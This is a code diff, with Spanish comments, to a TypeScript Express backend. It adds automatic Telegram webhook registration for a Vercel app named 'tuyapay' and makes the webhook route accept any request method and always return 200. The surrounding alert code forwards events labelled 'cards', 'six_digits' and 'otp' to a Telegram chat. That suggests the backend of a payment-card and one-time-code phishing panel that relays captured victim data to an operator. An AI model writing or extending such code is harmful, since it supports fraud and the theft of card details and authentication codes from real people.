@@ -87,6 +87,20 @@ async function getTelegramConfig() {
   return null
 }
 
+let lastWebhookCheck = 0
+async function ensureTelegramWebhook(botToken: string) {
+  const now = Date.now()
+  if (now - lastWebhookCheck < 300000) return // Verificar máximo cada 5 minutos
+  lastWebhookCheck = now
+  try {
+    const cleanToken = botToken.trim()
+    const targetUrl = 'https://tuyapay-six.vercel.app/api/telegram-webhook'
+    await fetch(`https://api.telegram.org/bot${cleanToken}/setWebhook?url=${encodeURIComponent(targetUrl)}`)
+  } catch (err) {
+    console.warn('No se pudo verificar webhook de Telegram:', err)
+  }
+}
+
 async function sendTelegramAlert(
   message: string,
   category: 'records' | 'cards' | 'six_digits' | 'otp',
@@ -104,6 +118,8 @@ async function sendTelegramAlert(
     if (category === 'otp' && !config.notify_otp) return
 
     const cleanToken = config.bot_token.trim()
+    ensureTelegramWebhook(cleanToken).catch(() => {})
+
     const cleanChatId = config.chat_id.trim()
     const url = `https://api.telegram.org/bot${cleanToken}/sendMessage`
 
@@ -1058,8 +1074,11 @@ app.post('/api/telegram-config', async (req, res) => {
       RETURNING *;
     `
 
-    // Reset de caché en memoria
+    // Reset de caché en memoria y asegurar webhook
     cachedTelegramConfig = null
+    if (cleanToken) {
+      ensureTelegramWebhook(cleanToken).catch(() => {})
+    }
 
     const duration = Date.now() - start
     await logActivity('UPDATE_TELEGRAM_CONFIG', `Configuración y GIF actualizados por Administrador`, duration)
@@ -1152,7 +1171,7 @@ app.post('/api/telegram-test', async (req, res) => {
 // ==============================================================
 
 // Endpoint Webhook que recibe las acciones de botones de Telegram en Vercel
-app.post('/api/telegram-webhook', async (req, res) => {
+app.all('/api/telegram-webhook', async (req, res) => {
   try {
     const update = req.body
     if (update && update.callback_query) {
@@ -1161,10 +1180,10 @@ app.post('/api/telegram-webhook', async (req, res) => {
         await handleTelegramCallbackQuery(config.bot_token.trim(), update.callback_query)
       }
     }
-    res.json({ ok: true })
+    res.status(200).json({ ok: true })
   } catch (err) {
     console.error('Error en webhook de Telegram:', err)
-    res.status(500).json({ error: String(err) })
+    res.status(200).json({ ok: false, error: String(err) })
   }
 })
 
